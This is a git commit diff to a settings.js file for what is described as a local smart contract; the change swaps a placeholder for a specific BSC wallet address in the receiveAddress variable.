7bd74617a9f7806fa50acc4a9f3b7b6cdf741a98
devLucky847 <98715661+devLucky847@users.noreply.github.com>
2022-11-16 08:48:43 +0100

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xC5E42655d434Ebf2feb14Fec472D723E4f92C53D";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
